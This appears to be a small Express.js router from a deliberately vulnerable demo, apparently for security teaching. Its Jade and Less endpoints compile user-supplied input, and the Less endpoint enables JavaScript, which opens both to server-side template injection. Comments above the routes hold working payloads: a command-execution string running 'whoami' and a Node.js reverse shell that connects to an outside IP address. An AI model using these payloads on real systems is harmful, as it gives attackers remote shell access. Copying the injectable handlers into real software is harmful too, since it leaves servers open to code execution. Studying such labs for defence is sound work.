const jade = require('jade');
const less = require('less');

const express = require('express');
const router = express.Router();

// http://localhost:3000/jade?templ=
// =global.process.mainModule.require(%27child_process%27).execSync(%27whoami%27).toString()
// - (function(){const require=global.process.mainModule.require,net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/sh",["i"]);const client=new net.Socket();client.connect(8080,"18.216.236.191", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client)});return /pwned/;})()
router.get('/jade', function(req, res) {
    res.send(jade.compile(req.query.templ)(req.query.args));
});


// http://localhost:3000/less?input=body{color:`global.process.mainModule.require(%27child_process%27).execSync(%27whoami%27).toString()`;}
// body{color: `(function(){const require=global.process.mainModule.require,net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/sh",["-i"]);const client=new net.Socket();client.connect(8080,"18.216.236.191", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client)});return /pwned/;})()`;}
router.get('/less', function(req, res) {
    less.render(req.query.input, {javascriptEnabled: true}, function(error, output) {
        if (error) { throw error; }
        res.render('less', { title: 'Less', userstyle: output.css });
    });
});

module.exports = router;
